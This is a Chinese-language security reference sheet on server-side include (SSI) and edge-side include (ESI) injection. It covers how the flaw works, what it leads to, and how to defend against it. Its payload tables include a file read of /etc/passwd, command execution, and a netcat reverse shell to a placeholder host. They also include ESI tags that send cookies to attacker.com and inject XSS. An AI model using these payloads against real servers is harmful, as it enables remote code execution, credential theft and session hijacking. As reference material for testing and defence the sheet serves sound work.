# 服务器端包含注入 (SSI 注入)

> 服务器端包含（SSI）是放置在 HTML 页面中的指令，在服务器端提供页面时进行评估。它们允许您向现有 HTML 页面添加动态生成的内容，而无需通过 CGI 程序或其他动态技术提供整个页面。

## SSI 注入原理

SSI 注入漏洞允许攻击者向 Web 应用程序注入服务器端包含指令。SSI 指令可以包含文件、执行命令或打印环境变量/属性。如果在 SSI 上下文中未对用户输入进行适当清理，攻击者可能利用这些输入操纵服务器端行为，访问敏感信息或执行命令。

### SSI 工作方式

SSI 指令通常采用以下格式：`<!--#directive param="value" -->`。当服务器处理包含这些指令的页面时，它会执行指定的操作，如包含其他文件、执行系统命令或显示环境变量。

### 漏洞成因

1. 用户输入直接嵌入到 SSI 上下文中
2. 未对用户输入进行适当的过滤或转义
3. 服务器配置允许执行 SSI 指令

### 影响

- 任意文件读取
- 远程代码执行
- 敏感信息泄露
- 服务器端请求伪造 (SSRF)
- 跨站脚本 (XSS)

## 目录

* [方法学](#方法学)
* [边缘端包含 (ESI)](#边缘端包含-esi)
* [防御措施](#防御措施)
* [参考资料](#参考资料)

## 方法学

SSI 注入发生在攻击者能够向 Web 应用程序输入服务器端包含指令时。

SSI 格式：`<!--#directive param="value" -->`

| 描述                  | 有效载荷                                   |
| --------------------- | ----------------------------------------- |
| 打印日期              | `<!--#echo var="DATE_LOCAL" -->`         |
| 打印文档名            | `<!--#echo var="DOCUMENT_NAME" -->`      |
| 打印所有变量          | `<!--#printenv -->`                      |
| 设置变量              | `<!--#set var="name" value="Rich" -->`   |
| 包含文件              | `<!--#include file="/etc/passwd" -->`    |
| 包含文件              | `<!--#include virtual="/index.html" -->` |
| 执行命令              | `<!--#exec cmd="ls" -->`                 |
| 反弹shell             | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |

## 边缘端包含 (ESI)

HTTP 代理无法区分来自上游服务器的真实 ESI 标签和嵌入在 HTTP 响应中的恶意标签。这意味着如果攻击者成功将 ESI 标签注入到 HTTP 响应中，代理将不加质疑地处理并评估它们，假设它们是来自上游服务器的合法标签。

某些代理需要在 Surrogate-Control HTTP 头中指定 ESI 处理。

```ps1
Surrogate-Control: content="ESI/1.0"
```

| 描述                  | 有效载荷                                   |
| --------------------- | ----------------------------------------- |
| 盲检测                | `<esi:include src=http://attacker.com>`  |
| XSS                   | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
| Cookie 窃取           | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
| 包含文件              | `<esi:include src="supersecret.txt">` |
| 显示调试信息          | `<esi:debug/>` |
| 添加 HTTP 头          | `<!--esi $add_header('Location','http://attacker.com') -->` |
| 内联片段              | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |

| 软件                  | 包含文件 | 变量 | Cookie | 需要上游头 | 主机白名单 |
| --------------------- | -------- | ---- | ------ | ---------- | ---------- |
| Squid3               | 是       | 是   | 是     | 是         | 否         |
| Varnish Cache        | 是       | 否   | 否     | 是         | 是         |
| Fastly               | 是       | 否   | 否     | 否         | 是         |
| Akamai ESI Test Server (ETS) | 是 | 是 | 是 | 否   | 否         |
| NodeJS' esi          | 是       | 是   | 是     | 否         | 否         |
| NodeJS' nodesi       | 是       | 否   | 否     | 否         | 可选       |

## 防御措施

### 输入验证
- 对所有用户输入进行严格验证
- 使用白名单验证允许的字符和格式
- 拒绝包含 SSI 指令的输入

### 输出编码
- 在将用户输入输出到页面之前进行适当的 HTML 编码
- 使用上下文相关的编码函数

### 服务器配置
- 禁用不必要的 SSI 功能
- 限制 SSI 指令的使用范围
- 更新服务器软件以修补已知漏洞

### 安全开发实践
- 避免将用户输入直接嵌入到 SSI 上下文中
- 使用模板引擎的安全功能
- 实施内容安全策略 (CSP)

### WAF 规则
- 配置 WAF 检测和阻止 SSI 注入尝试
- 监控和记录可疑活动

## 参考资料

* [超越 XSS：边缘端包含注入 - Louis Dion-Marcil - 2018年4月3日](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [DEF CON 26 - 边缘端包含注入：滥用缓存服务器进行 SSRF - ldionmarcil - 2018年10月23日](https://www.youtube.com/watch?v=VUZGZnpSg8I)
* [ESI 注入第二部分：滥用特定实现 - Philippe Arteau - 2019年5月2日](https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [利用服务器端包含注入 - n00py - 2017年8月15日](https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
* [服务器端包含/边缘端包含注入 - HackTricks - 2024年7月19日](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)
* [服务器端包含(SSI)注入 - Weilin Zhong, Nsrav - 2019年12月4日](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)
